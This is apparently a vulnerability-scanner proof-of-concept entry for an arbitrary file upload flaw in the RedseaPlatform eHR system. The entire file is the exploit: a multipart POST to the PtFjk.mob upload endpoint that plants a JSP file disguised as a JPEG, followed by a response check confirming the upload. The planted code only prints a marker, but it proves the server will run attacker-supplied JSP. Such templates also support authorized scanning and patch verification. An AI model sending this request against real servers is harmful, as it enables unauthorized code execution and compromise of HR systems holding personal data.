{
        'name': '57qi5rW35LqRZUhS PtFjk.mob 任意文件上传漏洞',
        'poc': [{'requests':{
            'method': 'post',
            'payload': '/RedseaPlatform/PtFjk.mob?method=upload',
            'headers': {
                'Accept-Encoding': 'gzip',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4'
            },
            'data': """------WebKitFormBoundaryt7WbDl1tXogoZys4\r\nContent-Disposition: form-data; name="fj_file"; filename="11.jsp"\r\nContent-Type:image/jpeg\r\n\r\n<% out.print("hello,eHR");%>\r\n------WebKitFormBoundaryt7WbDl1tXogoZys4--""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'herfUrl'
        }}]
    }